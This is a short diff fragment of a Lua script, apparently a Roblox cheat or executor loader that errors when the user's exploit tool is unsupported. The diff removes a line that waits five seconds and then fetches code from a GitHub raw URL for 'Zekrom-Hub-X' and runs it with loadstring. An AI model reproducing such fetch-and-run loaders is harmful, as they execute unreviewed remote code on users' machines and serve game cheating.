@@ -181,7 +181,3 @@ end
 else
 error("YOUR EXPLOIT IS NOT SUPPORTED!")
 end
-
-wait(5)
-
-loadstring(Game:HttpGet"https://raw.githubusercontent.com/ahmadsgamer2/Zekrom-Hub-X/main/Zekrom-Hub-X-exe")()
